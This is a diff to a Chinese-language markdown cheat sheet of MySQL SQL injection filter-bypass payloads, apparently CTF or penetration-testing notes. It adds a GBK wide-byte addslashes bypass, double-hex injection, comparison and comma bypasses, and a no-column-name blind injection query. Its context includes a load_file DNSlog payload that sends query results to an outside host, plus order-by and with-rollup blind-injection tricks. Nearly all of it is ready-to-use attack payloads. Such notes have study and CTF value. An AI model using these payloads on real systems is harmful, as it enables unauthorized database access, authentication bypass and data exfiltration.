@@ -39,8 +39,23 @@ select group_concat(table_name) from mysql.innodb_table_stats
 
 * `like` bypass `=`
 
+  >"%" 可用于定义通配符（模式中缺少的字母）
+  >
+  >从 "Persons" 表中选取居住在以 "g" 结尾的城市里的人
+  >
+  >```sql
+  >SELECT * FROM Persons
+  >WHERE City LIKE '%g'
+  >```
+
 * 利用双hex(保证纯数字字符)注入
   ``'%2B(select hex(hex(database())))%2B'0``
+
+* GBK编码下 ``addslash()`` 绕过 宽字节绕过
+
+  ``%df%27``
+
+  原理就是 addslash后变成``%df%5c%27``了
 
 * `select .` bypass 一般是堆叠注入
 
@@ -182,6 +197,9 @@ select group_concat(table_name) from mysql.innodb_table_stats
 
   * 利用`if() ,like,or,>,=,<`
 
+  * ``>`` 可以用 ``greatest`` + ``=`` 绕过
+    greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
+
     ```python
     #coding=utf-8
     import requests
@@ -287,6 +305,7 @@ thr7.start()
     绕过
     ```sql
     benchmark(1000000,sha(1))
+    pow(99,99)
     ```
 
     参考资料：https://www.anquanke.com/post/id/170626
@@ -314,6 +333,30 @@ thr7.start()
     ```
     select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
     ```
+  * 逗号绕过 
+    
+    对于``substr()``和``mid()``这两个方法可以使用``from to``的方式来替代逗号分隔的参数
+
+    ``limit`` 用``offset``绕过
+    
+    使用join：
+    
+    ```sql
+    union select 1,2     #等价于
+    union select * from (select 1)a join (select 2)b
+    ```
+    
+    使用like：
+    
+    ```sql
+    select user() like 'r%'  -- 匹配r开头
+    ```
+
+    无列名盲注绕过：
+    
+    ```
+    select c from (select * from (select 1 `a`)m join (select 3 `b`)n join (select 4 `c`)p join (select 5 `d`)q  join (select 6 `e`)r where 0 union select * from minil_users1 )x limit 1 offset 2
+    ```
   * 空格绕过
     
     mysql查询的时候将会忽略字符串尾部的空格
@@ -327,7 +370,7 @@ thr7.start()
 
     https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/
 
-    2. 利用 order by的特性进行盲注
+    1. 利用 order by的特性进行盲注
 
       ```
       MariaDB [test]> select * from users union select 1,2,3 order by 3;
@@ -351,7 +394,7 @@ thr7.start()
       ```
     *  select * from users2 where 1 group by password with rollup having password is NULL;
     
-    3. 利用 with rollup 的特性构造字段 NULL 绕过验证
+    1. 利用 with rollup 的特性构造字段 NULL 绕过验证
        ```
         MariaDB [test]> select * from users2 where 1 group by 1 with rollup;
         +----+----------+----------+-------+
